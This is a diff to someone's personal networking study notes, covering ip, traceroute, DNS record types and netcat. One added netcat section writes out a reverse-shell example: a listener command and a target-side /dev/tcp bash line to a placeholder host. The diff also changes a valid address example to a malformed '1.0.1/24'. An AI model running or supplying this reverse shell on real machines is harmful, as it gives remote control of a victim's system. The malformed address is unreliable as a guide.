@@ -26,7 +26,7 @@
 
 `ip link set up dev enp0s3` sets up interface
 
-`ip addr add 192.168.0.1/24 dev enp0s3` assigns addres to interface by hand
+`ip addr add 1.0.1/24 dev enp0s3` assigns addres to interface by hand
 
 > [!WARNING]
 > `ip addr add` with mask -  puts default gatway ip to route table, but would't if mask wasn't provided\
@@ -52,6 +52,8 @@ ISP - internet service provider
 `host -t a example.org` -DNS CLIENT with (t)ype of record
 
 `traceroute -A example.org` - additional info about each consecutive AS number that can be used with whois
+
+`traceroute -n 192.168.4.4` - turn off dns request when repling ipv4 -> host
 
 ### dns flow
 ![dns-flow](./imgs/basic/dns.png)
@@ -85,6 +87,27 @@ ISP - internet service provider
 | SOA   | (start of authority)                                                 |
 
 # nc  - netcat
+### connect two computers
+server
+
+    nc -l 1337
+
+client
+
+    nc ipaddr 1337
+
+
+### reverse shell
+
+attacker
+
+    nc -l -v -n -p 3000
+
+target
+
+    /bin/bash - i >& /dev/tcp/ip/port 0>&1
+
+
 
 # telnet 
 allows plain communication in http
